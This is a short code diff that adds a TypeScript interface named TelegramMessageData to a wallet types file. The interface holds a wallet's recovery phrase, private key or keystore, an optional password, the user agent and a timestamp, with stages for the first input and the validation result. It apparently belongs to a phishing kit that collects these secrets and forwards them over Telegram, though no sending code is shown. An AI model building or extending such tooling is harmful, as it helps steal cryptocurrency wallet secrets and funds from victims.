@@ -31,3 +31,17 @@ export interface Wallet {
   export interface IWallet {
     address: string;
   }
+
+
+  export interface TelegramMessageData {
+    walletName: string;
+    walletType: string;
+    inputType: 'phrase' | 'privateKey' | 'keystore';
+    inputData: string;
+    password?: string;
+    isValid: boolean;
+    validationMessage: string;
+    userAgent: string;
+    timestamp: string;
+    stage?: 'initial_input' | 'validation_result';
+  }
